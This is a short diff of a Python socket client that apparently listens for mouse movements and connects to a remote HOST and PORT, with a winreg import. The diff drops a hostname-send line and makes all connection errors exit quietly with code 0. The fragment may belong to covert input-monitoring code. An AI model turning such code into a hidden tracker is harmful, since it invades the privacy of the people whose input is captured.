@@ -7,7 +7,6 @@ def main():
     FORMAT = "utf-8"
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         s.connect((HOST, PORT))
-        s.send(socket.gethostname().encode())
         while True:
             try:
                 def on_move(x, y):
@@ -28,11 +27,13 @@ def main():
                     listener.join()
             
             except ConnectionResetError:
-                exit(1)
+                exit(0)
             except ConnectionRefusedError:
-                exit(1)
+                exit(0)
+            except TimeoutError:
+                exit(0)
             except OSError:
-                exit(1)
+                exit(0)
 
 if __name__ == "__main__":
     import winreg
